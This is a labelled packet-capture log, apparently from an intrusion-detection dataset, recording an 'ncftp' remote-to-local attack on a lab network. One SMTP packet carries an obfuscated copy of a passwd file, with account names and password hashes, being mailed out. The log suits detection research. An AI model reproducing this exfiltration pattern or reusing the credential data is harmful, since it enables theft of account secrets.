"ncftp"," r2l", "3017749","21:45:14.186995","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017750","21:45:14.192388","172.16.118.20","172.16.114.50","TCP","60","1305 → 113 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017751","21:45:14.192639","172.16.114.50","172.16.118.20","TCP","60","113 → 1305 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017752","21:45:14.193071","172.16.118.20","172.16.114.50","TCP","60","1305 → 113 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017753","21:45:14.193198","172.16.118.20","172.16.114.50","TCP","63","1305 → 113 [PSH, ACK] Seq=1 Ack=1 Win=32120 Len=9"
"ncftp"," r2l", "3017754","21:45:14.195294","172.16.118.20","172.16.114.50","TCP","60","20 → 6325 [FIN, ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017755","21:45:14.195531","172.16.114.50","172.16.118.20","TCP","60","6325 → 20 [ACK] Seq=1 Ack=2 Win=31744 Len=0"
"ncftp"," r2l", "3017756","21:45:14.195674","172.16.114.50","172.16.118.20","TCP","60","6325 → 20 [FIN, ACK] Seq=1 Ack=2 Win=31744 Len=0"
"ncftp"," r2l", "3017757","21:45:14.196075","172.16.118.20","172.16.114.50","TCP","60","20 → 6325 [ACK] Seq=2 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017758","21:45:14.200523","172.16.114.50","172.16.112.20","DNS","86","Standard query 0x6cd7 PTR 20.118.16.172.in-addr.arpa"
"ncftp"," r2l", "3017759","21:45:14.201437","172.16.112.20","172.16.114.50","DNS","175","Standard query response 0x6cd7 PTR 20.118.16.172.in-addr.arpa PTR linux2.eyrie.af.mil NS hobbes.eyrie.af.mil A 172.16.112.20"
"ncftp"," r2l", "3017760","21:45:14.202183","172.16.114.50","172.16.112.20","DNS","79","Standard query 0x6cd8 A linux2.eyrie.af.mil"
"ncftp"," r2l", "3017761","21:45:14.202702","172.16.112.20","172.16.114.50","DNS","144","Standard query response 0x6cd8 A linux2.eyrie.af.mil A 172.16.118.20 NS hobbes.eyrie.af.mil A 172.16.112.20"
"ncftp"," r2l", "3017762","21:45:14.202977","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=678 Ack=1106 Win=31744 Len=0"
"ncftp"," r2l", "3017763","21:45:14.203410","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017764","21:45:14.204340","172.16.114.50","172.16.118.20","TELNET","66","Telnet Data ..."
"ncftp"," r2l", "3017765","21:45:14.207078","172.16.114.50","172.16.118.20","TCP","90","113 → 1305 [PSH, ACK] Seq=1 Ack=10 Win=31744 Len=36"
"ncftp"," r2l", "3017766","21:45:14.207338","172.16.114.50","172.16.118.20","TCP","60","113 → 1305 [FIN, ACK] Seq=37 Ack=10 Win=31744 Len=0"
"ncftp"," r2l", "3017767","21:45:14.207565","172.16.118.20","172.16.114.50","TCP","60","1305 → 113 [FIN, ACK] Seq=10 Ack=37 Win=32120 Len=0"
"ncftp"," r2l", "3017768","21:45:14.207778","172.16.118.20","172.16.114.50","TCP","60","1305 → 113 [ACK] Seq=11 Ack=38 Win=32120 Len=0"
"ncftp"," r2l", "3017769","21:45:14.207848","172.16.114.50","172.16.118.20","TCP","60","113 → 1305 [ACK] Seq=38 Ack=11 Win=31744 Len=0"
"ncftp"," r2l", "3017770","21:45:14.208573","172.16.118.20","172.16.114.50","SMTP","138","S: 220 linux2.eyrie.af.mil ESMTP Sendmail 8.8.7/8.8.7; Tue, 6 Apr 1999 21:45:31 -0400"
"ncftp"," r2l", "3017771","21:45:14.209055","172.16.114.50","172.16.118.20","SMTP","78","C: EHLO marx.eyrie.af.mil"
"ncftp"," r2l", "3017772","21:45:14.210024","172.16.118.20","172.16.114.50","SMTP","239","S: 250 linux2.eyrie.af.mil Hello bramy@marx.eyrie.af.mil [172.16.114.50], pleased to meet you | 250 EXPN | 250 VERB | 250 8BITMIME | 250 SIZE | 250 DSN | 250 ONEX | 250 ETRN | 250 XUSR | 250 HELP"
"ncftp"," r2l", "3017773","21:45:14.210963","172.16.114.50","172.16.118.20","SMTP","102","C: MAIL From:<bramy@marx.eyrie.af.mil> SIZE=21709"
"ncftp"," r2l", "3017774","21:45:14.218571","172.16.118.20","172.16.114.50","SMTP","98","S: 250 <bramy@marx.eyrie.af.mil>... Sender ok"
"ncftp"," r2l", "3017775","21:45:14.218937","172.16.114.50","172.16.118.20","SMTP","91","C: RCPT To:<lucyj@linux2.eyrie.af.mil>"
"ncftp"," r2l", "3017776","21:45:14.222744","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=151 Ack=810 Win=32120 Len=0"
"ncftp"," r2l", "3017777","21:45:14.222957","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=678 Ack=1130 Win=31744 Len=0"
"ncftp"," r2l", "3017778","21:45:14.232732","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=314 Ack=110 Win=32736 Len=0"
"ncftp"," r2l", "3017779","21:45:14.252255","172.16.118.20","172.16.114.50","SMTP","103","S: 250 <lucyj@linux2.eyrie.af.mil>... Recipient ok"
"ncftp"," r2l", "3017780","21:45:14.252603","172.16.114.50","172.16.118.20","SMTP","60","C: DATA"
"ncftp"," r2l", "3017781","21:45:14.253724","172.16.118.20","172.16.114.50","SMTP","104","S: 354 Enter mail, end with ." on a line by itself""
"ncftp"," r2l", "3017782","21:45:14.256042","172.16.114.50","172.16.118.20","SMTP","1078","C: DATA fragment, 1024 bytes"
"ncftp"," r2l", "3017783","21:45:14.257456","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017784","21:45:14.258713","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017785","21:45:14.259975","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017786","21:45:14.261243","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017787","21:45:14.262502","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017788","21:45:14.262783","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=413 Ack=5520 Win=32736 Len=0"
"ncftp"," r2l", "3017789","21:45:14.264579","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017790","21:45:14.265840","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017791","21:45:14.267111","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017792","21:45:14.268369","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017793","21:45:14.269630","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017794","21:45:14.272719","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=413 Ack=15740 Win=32736 Len=0"
"ncftp"," r2l", "3017795","21:45:14.274513","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017796","21:45:14.275771","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017797","21:45:14.277033","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017798","21:45:14.278291","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017799","21:45:14.282711","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=413 Ack=21580 Win=32736 Len=0"
"ncftp"," r2l", "3017800","21:45:14.283640","172.16.114.50","172.16.118.20","IMF","713","from: Bram Yves <bramy@marx.eyrie.af.mil>, , --r--o--o--tKK--F--O--r--l--H--s--J--0--v--0--m--t.KK--0KK--0KK--r--o--o--tKK/--r--o--o--tKK/--b--i--n/--b--a--s--h  , --b--i--nKK*KK--1KK--1KK--b--i--nKK/--b--i--nKK  , --d--a--e--m--o--nKK*KK--2KK--2KK--d--a--e--m--o--nKK/--s--b--i--nKK  , --a--d--mKK*KK--3KK--4KK--a--d--mKK/--v--a--r/--a--d--mKK  , --l--pKK*KK--4KK--7KK--l--pKK/--v--a--r/--s--p--o--o--l/--l--p--dKK  , --s--y--n--cKK*KK--5KK--0KK--s--y--n--cKK/--s--b--i--nKK/--b--i--n/--s--y--n--c  , --s--h--u--t--d--o--w--nKK*KK--6KK--0KK--s--h--u--t--d--o--w--nKK/--s--b--i--nKK/--s--b--i--n/--s--h--u--t--d--o--w--n  , --h--a--l--tKK*KK--7KK--0KK--h--a--l--tKK/--s--b--i--nKK/--s--b--i--n/--h--a--l--t  , --m--a--i--lKK*KK--8KK--1--2KK--m--a--i--lKK/--v--a--r/--s--p--o--o--l/--m--a--i--lKK  , --n--e--w--sKK*KK--9KK--1--3KK--n--e--w--sKK/--v--a--r/--s--p--o--o--l/--n--e--w--sKK  , --u--u--c--pKK*KK--1--0KK--1--4KK--u--u--c--pKK/--v--a--r/--s--p--o--o--l/--u--u--c--pKK  , --o--p--e--r--a--t--o--rKK*KK--1--1KK--0KK--o--p--e--r--a--t--o--rKK/--r--o--o--tKK  , --g--a--m--e--sKK*KK--1--2KK--1--0--0KK--g--a--m--e--sKK/--u--s--r/--g--a--m--e--sKK  , --g--o--p--h--e--rKK*KK--1--3KK--3--0KK--g--o--p--h--e--rKK/--u--s--r/--l--i--b/--g--o--p--h--e--r---d--a--t--aKK  , --f--t--pKK*KK--1--4KK--5--0KK--F--T--P --U--s--e--rKK/--h--o--m--e/--f--t--pKK  , --n--o--b--o--d--yKK*KK--9--9KK--9--9KK--N--o--b--o--d--yKK/KK  , --d--j--w--e--b--e--rKK--E--r--q--R--O--6--U--v--i--W--Q--M--YKK--5--0--0KK--5--0--0KK--R--H--S --L--i--n--u--x --U--s--e--rKK/.--s--i--m/--h--o--m--e/--d--j--w--e--b--e--rKK/--b--i--n/--b--a--s--h  , --d--a--n--wKK--n--u--d--p--i--W--b--c--y--I--6--R--QKK--5--0--1KK--5--0--1KK--R--H--S --L--i--n--u--x --U--s--e--rKK/.--s--i--m/--h--o--m--e/--d--a--n--wKK/--b--i--n/--b--a--s--h  , --j--o--e--u--s--e--rKKKK--5--0--2KK--5--0--2KK--R--e--d --H--a--t --L--i--n--u--x --U--s--e--r,,,,KK/--h--o--m--e/--j--o--e--u--s--e--rKK/--b--i--n/--b--a--s--h  , --s--w--e--b--s--t--e--rKK--j--p--W--H--o--f--b--u--G--a--s--7--UKK--5--0--3KK--5--0--4KK--R--H--S --L--i--n--u--x --U--s--e--rKK/.--s--i--m/--h--o--m--e/--s--w--e--b--s--t--e--rKK/--b--i--n/--t--c--s--h  , --j--o--eKK--u--n--2--R--r--7--w--M.--4--b--Z.KK--5--0--4KK--5--0--6KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--j--o--eKK/--b--i--n/--b--a--s--h  , --d--m--c--c--l--u--n--gKK--M--H--z--Y--Z--C--L--3--S--N--v--Y--IKK--5--0--6KK--5--0--7KK--R--H--S --L--i--n--u--x --U--s--e--rKK/.--s--i--m/--h--o--m--e/--d--m--c--c--l--u--n--gKK/--b--i--n/--b--a--s--h  , --w--w--wKK--K--k--a--y--y--O--m--q--m--C--s--U--UKK--5--0--8KK--5--0--9KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--w--w--wKK/--b--i--n/--b--a--s--h  , --s--g--o--r--t--o--nKK/--r--V--Y--q--h--6--C--E--P--6--X--IKK--1--5--5--6--5KK--1--5--5--6--5KK--S--a--m --G--o--r--t--o--nKK/.--s--i--m/--h--o--m--e/--s--g--o--r--t--o--nKK/--b--i--n/--t--c--s--h  , --l--o--w--e--l--lKK--G--f--9--P--Y--Q--H--O/--C--P--A--wKK--5--0--9KK--5--1--1KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--l--o--w--e--l--lKK/--b--i--n/--b--a--s--h  , --s--p--r--i--n--g--e--rKK--t--t--Y--2--V--Q--e--P--I--w--i--V--oKK--5--1--0KK--5--1--2KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--s--p--r--i--n--g--e--rKK/--b--i--n/--b--a--s--h  , --w--i--n--f--r--e--yKK--s--z--H--4--9--3--K--P--q--W--5--w--cKK--5--1--1KK--5--1--3KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--w--i--n--f--r--e--yKK/--b--i--n/--b--a--s--h  , --c--a--r--v--e--yKK--r--8--o--q--0--n--t--C--E--V--o--8--2KK--5--1--2KK--5--1--4KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--c--a--r--v--e--yKK/--b--i--n/--b--a--s--h  , --g--i--t--t--i--n--sKK--H--C--8--C--A--P--v--h--4--c--X--A--gKK--5--1--3KK--5--1--5KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--g--i--t--t--i--n--sKK/--b--i--n/--b--a--s--h  , --c--h--a--r--l--i--eKKKK--5--1--4KK--5--1--6KK--R--H--S --L--i--n--u--x --U--s--e--rKK/--h--o--m--e/--c--h--a--r--l--i--eKK/--b--i--n/--b--a--s--h  , --s--u--p--p--o--r--tKKKK--5--1--5KK--5--1--7KK--R--H--S --L--i--n--u--x --U--s--e--rKK/-"
"ncftp"," r2l", "3017801","21:45:14.300676","172.16.118.20","172.16.114.50","SMTP","98","S: 250 VAA17431 Message accepted for delivery"
"ncftp"," r2l", "3017802","21:45:14.302375","172.16.114.50","172.16.118.20","SMTP","60","C: QUIT"
"ncftp"," r2l", "3017803","21:45:14.303065","172.16.118.20","172.16.114.50","SMTP","98","S: 221 linux2.eyrie.af.mil closing connection"
"ncftp"," r2l", "3017804","21:45:14.303398","172.16.114.50","172.16.118.20","TCP","60","6334 → 25 [FIN, ACK] Seq=22245 Ack=501 Win=31744 Len=0"
"ncftp"," r2l", "3017805","21:45:14.303812","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=501 Ack=22246 Win=32735 Len=0"
"ncftp"," r2l", "3017806","21:45:14.304066","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [FIN, ACK] Seq=501 Ack=22246 Win=32736 Len=0"
"ncftp"," r2l", "3017807","21:45:14.304283","172.16.114.50","172.16.118.20","TCP","60","6334 → 25 [ACK] Seq=22246 Ack=502 Win=31744 Len=0"
"ncftp"," r2l", "3017808","21:45:15.707368","172.16.112.20","172.16.112.10","NTP","90","NTP Version 3, client"
"ncftp"," r2l", "3017809","21:45:15.707837","172.16.112.10","172.16.112.20","NTP","90","NTP Version 3, server"
"ncftp"," r2l", "3017810","21:45:17.288127","","","LOOP","60","Reply"
"ncftp"," r2l", "3017811","21:45:21.186983","172.16.113.50","172.16.112.10","NTP","90","NTP Version 3, client"
"ncftp"," r2l", "3017812","21:45:21.187394","172.16.112.10","172.16.113.50","NTP","90","NTP Version 3, server"
"ncftp"," r2l", "3017813","21:45:26.254534","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"ncftp"," r2l", "3017814","21:45:26.254755","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"ncftp"," r2l", "3017815","21:45:27.285929","","","LOOP","60","Reply"
"ncftp"," r2l", "3017816","21:45:29.156863","","","CDP","324","Device ID: loud.eyrie.af.mil.eyrie.af.mil  Port ID: Ethernet1  "
"ncftp"," r2l", "3017817","21:45:29.935122","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"ncftp"," r2l", "3017818","21:45:37.283759","","","LOOP","60","Reply"
"ncftp"," r2l", "3017819","21:45:40.317727","172.16.114.50","172.16.112.10","NTP","90","NTP Version 3, client"
"ncftp"," r2l", "3017820","21:45:40.318225","172.16.112.10","172.16.114.50","NTP","90","NTP Version 3, server"
"ncftp"," r2l", "3017821","21:45:45.966467","","","ARP","60","Who has 172.16.112.10? Tell 172.16.114.50"
"ncftp"," r2l", "3017822","21:45:45.966532","","","ARP","42","172.16.112.10 is at 08:00:20:83:4a:82"
"ncftp"," r2l", "3017823","21:45:47.281525","","","LOOP","60","Reply"
"ncftp"," r2l", "3017824","21:45:51.258601","","","ARP","60","Who has 172.16.112.100? Tell 172.16.112.20"
"ncftp"," r2l", "3017825","21:45:53.442940","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017826","21:45:53.443522","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017827","21:45:53.461741","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=152 Ack=811 Win=32120 Len=0"
"ncftp"," r2l", "3017828","21:45:53.471860","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017829","21:45:53.472211","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017830","21:45:53.491729","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=153 Ack=812 Win=32120 Len=0"
"ncftp"," r2l", "3017831","21:45:53.501847","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017832","21:45:53.502198","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017833","21:45:53.521720","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=154 Ack=813 Win=32120 Len=0"
"ncftp"," r2l", "3017834","21:45:53.541832","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017835","21:45:53.542183","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017836","21:45:53.561746","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=155 Ack=814 Win=32120 Len=0"
"ncftp"," r2l", "3017837","21:45:53.573036","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017838","21:45:53.573377","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017839","21:45:53.573724","172.16.114.50","172.16.118.20","FTP","60","Request: QUIT"
"ncftp"," r2l", "3017840","21:45:53.574587","172.16.118.20","172.16.114.50","FTP","68","Response: 221 Goodbye."
"ncftp"," r2l", "3017841","21:45:53.574918","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [FIN, ACK] Seq=684 Ack=1144 Win=31744 Len=0"
"ncftp"," r2l", "3017842","21:45:53.575336","172.16.118.20","172.16.114.50","TCP","60","21 → 6207 [ACK] Seq=1144 Ack=685 Win=32735 Len=0"
"ncftp"," r2l", "3017843","21:45:53.575499","172.16.118.20","172.16.114.50","TCP","60","21 → 6207 [FIN, ACK] Seq=1144 Ack=685 Win=32736 Len=0"
"ncftp"," r2l", "3017844","21:45:53.575726","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=685 Ack=1145 Win=31744 Len=0"
"ncftp"," r2l", "3017845","21:45:53.591735","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=157 Ack=816 Win=32120 Len=0"
"ncftp"," r2l", "3017846","21:45:53.600931","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017847","21:45:53.611729","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=157 Ack=822 Win=32120 Len=0"
"ncftp"," r2l", "3017848","21:45:56.248246","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"ncftp"," r2l", "3017849","21:45:56.248448","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"ncftp"," r2l", "3017850","21:45:57.279323","","","LOOP","60","Reply"
"ncftp"," r2l", "3017851","21:45:59.028809","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"ncftp"," r2l", "3017852","21:46:03.924553","172.16.112.50","172.16.112.10","NTP","90","NTP Version 3, client"
"ncftp"," r2l", "3017853","21:46:03.925022","172.16.112.10","172.16.112.50","NTP","90","NTP Version 3, server"
"ncftp"," r2l", "3017854","21:46:07.313381","","","LOOP","60","Reply"
"ncftp"," r2l", "3017855","21:46:13.607348","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017856","21:46:13.607734","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017857","21:46:13.626123","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=158 Ack=823 Win=32120 Len=0"
"ncftp"," r2l", "3017858","21:46:13.626305","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017859","21:46:13.626637","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017860","21:46:13.646113","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=159 Ack=824 Win=32120 Len=0"
"ncftp"," r2l", "3017861","21:46:13.656222","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017862","21:46:13.656554","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017863","21:46:13.676110","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=160 Ack=825 Win=32120 Len=0"
"ncftp"," r2l", "3017864","21:46:13.686222","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017865","21:46:13.686553","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017866","21:46:13.706103","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=161 Ack=826 Win=32120 Len=0"
"ncftp"," r2l", "3017867","21:46:13.716222","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017868","21:46:13.716553","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017869","21:46:13.736093","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=162 Ack=827 Win=32120 Len=0"
"ncftp"," r2l", "3017870","21:46:13.746371","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017871","21:46:13.746703","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017872","21:46:13.766108","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=163 Ack=828 Win=32120 Len=0"
"ncftp"," r2l", "3017873","21:46:13.777370","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017874","21:46:13.777719","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017875","21:46:13.781075","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [FIN, ACK] Seq=832 Ack=165 Win=31744 Len=0"
"ncftp"," r2l", "3017876","21:46:13.781474","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=165 Ack=833 Win=32120 Len=0"
"ncftp"," r2l", "3017877","21:46:13.781728","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [FIN, ACK] Seq=165 Ack=833 Win=32120 Len=0"
"ncftp"," r2l", "3017878","21:46:13.781944","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=833 Ack=166 Win=31744 Len=0"
"ncftp"," r2l", "3017879","21:46:16.904306","172.16.114.207","196.37.75.158","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017880","21:46:16.907180","196.37.75.158","172.16.114.207","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017881","21:46:16.923131","172.16.114.207","196.37.75.158","TCP","60","16442 → 23 [ACK] Seq=5387 Ack=36480 Win=32120 Len=0"
"ncftp"," r2l", "3017882","21:46:17.310962","","","LOOP","60","Reply"
"ncftp"," r2l", "3017883","21:46:19.693479","172.16.112.20","172.16.112.10","NTP","90","NTP Version 3, client"
"ncftp"," r2l", "3017884","21:46:19.693977","172.16.112.10","172.16.112.20","NTP","90","NTP Version 3, server"
"ncftp"," r2l", "3017885","21:46:22.122787","172.16.114.207","196.37.75.158","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017886","21:46:22.123847","196.37.75.158","172.16.114.207","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017887","21:46:22.142048","172.16.114.207","196.37.75.158","TCP","60","16442 → 23 [ACK] Seq=5388 Ack=36481 Win=32120 Len=0"
"ncftp"," r2l", "3017888","21:46:25.155112","172.16.113.50","172.16.112.10","NTP","90","NTP Version 3, client"
"ncftp"," r2l", "3017889","21:46:25.155539","172.16.112.10","172.16.113.50","NTP","90","NTP Version 3, server"
"ncftp"," r2l", "3017890","21:46:26.242174","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"ncftp"," r2l", "3017891","21:46:26.242395","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"ncftp"," r2l", "3017892","21:46:26.301613","172.16.114.207","196.37.75.158","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017893","21:46:26.302622","196.37.75.158","172.16.114.207","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017894","21:46:26.321172","172.16.114.207","196.37.75.158","TCP","60","16442 → 23 [ACK] Seq=5389 Ack=36482 Win=32120 Len=0"
"ncftp"," r2l", "3017895","21:46:26.665047","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"ncftp"," r2l", "3017896","21:46:27.504701","","","LOOP","60","Reply"
"ncftp"," r2l", "3017897","21:46:29.187695","","","CDP","324","Device ID: loud.eyrie.af.mil.eyrie.af.mil  Port ID: Ethernet1  "
"ncftp"," r2l", "3017898","21:46:30.480602","172.16.114.207","196.37.75.158","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017899","21:46:30.481674","196.37.75.158","172.16.114.207","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017900","21:46:30.500277","172.16.114.207","196.37.75.158","TCP","60","16442 → 23 [ACK] Seq=5390 Ack=36483 Win=32120 Len=0"
